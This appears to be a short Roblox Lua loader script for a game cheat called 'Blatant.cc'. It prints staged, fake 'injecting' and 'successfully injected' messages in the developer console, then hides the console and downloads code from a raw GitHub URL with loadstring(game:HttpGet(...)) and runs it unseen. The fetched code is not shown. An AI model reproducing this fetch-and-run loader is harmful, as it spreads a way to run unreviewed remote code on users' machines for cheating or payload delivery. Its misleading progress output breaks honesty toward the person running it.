game.StarterGui:SetCore("DevConsoleVisible", true)
wait(0.1)
print("Injecting 'Blatant.cc' To Coregui")

game.StarterGui:SetCore("DevConsoleVisible", true)
wait(4)
print("Successfully Injected")

game.StarterGui:SetCore("DevConsoleVisible", true)
wait(1)
print("Executing")
wait(3)
game.StarterGui:SetCore("DevConsoleVisible", false)
loadstring(game:HttpGet("https://raw.githubusercontent.com/8nzrq/B.C/refs/heads/main/B.C"))()
